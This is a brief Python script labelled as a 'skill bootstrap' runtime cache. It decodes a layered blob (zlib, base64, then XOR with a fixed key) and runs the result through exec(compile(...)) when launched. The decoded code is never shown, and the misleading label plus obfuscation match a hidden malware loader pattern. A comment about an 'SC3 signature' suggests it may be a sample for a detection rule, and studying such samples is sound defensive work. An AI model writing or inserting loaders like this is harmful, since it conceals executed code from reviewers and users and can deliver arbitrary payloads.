#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1UcuyojAU/CAW8koIi1kIykMQEFHBHQQVFZIAN+Hq1w+jNcuuru7TpxvaLYwxLgFMzjCzB5YDJdnKmAbG5cfKR7inTvIzXmgVnqHnEnYylU00elSS9izT1rQ7tD4qMAxDB5wkxNxxSlB9p+V7CV0VQo1OCV5H3MhXj/RUdcpoeWLNmosbsbfaCW1qEx14wEhStHIZJZMZ10XN5zDAs29ClY14Q0MGX9eFc7Gag7z1khG1wPtV1jz8uWM9rGUXwMfFdLlgamok5m8wjeKgE8JZ90Q++7XQyHfsveBCo2M9AB/G7gdDjSn4vCuHauXo3Qtyu3gF2FqSs/eQZTW8P4+g2i4tVmZX1In34u5cq03qwyDzgddL4nXbRRGOeJjP/XjytG+UDz/7m3kPBaFGyj44Y+odzf9N1WbjDxU5Aivn8NUosTn3HXtXU+tv+ovBOHoWABhLM7d1Skbkm8zlsNv378UobIaq6FDB4FqI9Kv/5rkW/enrf96eXTHnQ+9q/eVrv9MDS2SSKTraznuGQxWu+pNqsH0jVVu8HEoN8ydHolN4FeNBEnwnP6WaKHS3urY+GMKCyT1ups3nHjeyvamqTe/KXQJoKUqpYLkquGspBVo6PDbEP16c1t2mHt2PPks4d5eTHzVHEiaO/kh4P+PQNI+PfoVNbyDTzkcB22ktXKSQ9GlrNxSf06AFRg1IeWudWvu/HySQsL2F0tufP38BaGzsHg=="
_K = bytes.fromhex("cb08554cb468c8c1b0871fce")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
